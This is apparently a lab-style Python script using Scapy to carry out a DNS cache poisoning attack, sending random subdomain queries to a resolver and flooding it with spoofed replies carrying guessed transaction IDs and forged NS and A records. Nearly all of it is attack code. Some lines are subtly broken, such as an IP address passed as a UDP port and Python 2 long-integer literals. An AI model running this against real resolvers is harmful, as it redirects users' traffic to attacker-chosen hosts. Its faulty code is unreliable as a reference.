import random
from scapy.all import *
from scapy.layers.dns import *
from scapy.layers.inet import UDP

ENTRY_NUM = 10000
fakeURL = []
spoofedIP = '10.4.17.90'
victim_dest_ip = '10.4.17.55'
victim_dest_port = 53
authority = '.mysite.shue'
prefix = 'abcdefghijklmnopqrstuvwxyz1234567890'

print('Generating fake URLs...')

for i in range(ENTRY_NUM):
    fakeURL.append(''.join(random.choice(prefix)for _ in range(5)) + authority)

print('done')

#######################################################################

url = fakeURL[i]
for i in range(0, ENTRY_NUM):
    print('Trying %s' % (url))
    url = fakeURL[i]
    query = IP(dst='10.4.17.55')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=url))
    send(query,verbose=0)
    for i in range(100):
        trans_id = random.randint(0x0000, 0xffff)
        pkt = IP(dst=victim_dest_ip, src='10.4.17.90')/UDP(dport='10.4.17.60')/DNS(id=trans_id,qr=1L,aa=1L,qd=DNSQR(qname=url,qtype='A',qclass='IN'),an=DNSRR(rrname=url, type='A', rclass='IN', ttl=84600,rdata='192.168.1.1'), ns=DNSRR(rrname='mysite-ns.shue', type='NS', rclass='IN', ttl=84000, rdata='mysite-ns.shue'), ar=DNSRR(rrname='mysite-ns.shue', type='A', rclass='IN', ttl=84000, rdata='10.4.17.55'))
        send(pkt, verbose=0)


